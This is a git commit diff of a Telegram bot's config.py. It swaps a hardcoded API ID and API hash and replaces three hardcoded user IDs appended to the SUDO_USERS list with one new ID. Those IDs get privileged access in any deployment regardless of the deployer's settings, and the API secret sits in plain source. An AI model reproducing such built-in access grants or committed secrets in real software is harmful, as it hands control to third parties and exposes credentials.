917e1e30a15af3f98f8de03604ae7362b8f82ea1
⪻乂  ᑌ ℞ Ꭵ ᙭ ᙭ ꗃ 乂⪼⇝⎝ツ⎠﹃Ό <155140402+URIXXxNAITIK@users.noreply.github.com>
2024-01-16 17:18:37 +0530

    Update config.py

--- config.py
+++ config.py
@@ -10,8 +10,8 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 
 #values
-API_ID = 18136872
-API_HASH = "312d861b78efcd1b02183b2ab52a83a4"
+API_ID = 23205659
+API_HASH = "c98c0e38320afc4f609e184b95d2e3d6"
 CMD_HNDLR = getenv("CMD_HNDLR", default=".")
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
@@ -26,9 +26,7 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(6919199044)
-SUDO_USERS.append(6762113050)
-SUDO_USERS.append(6876910746)
+SUDO_USERS.append(6757174757)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
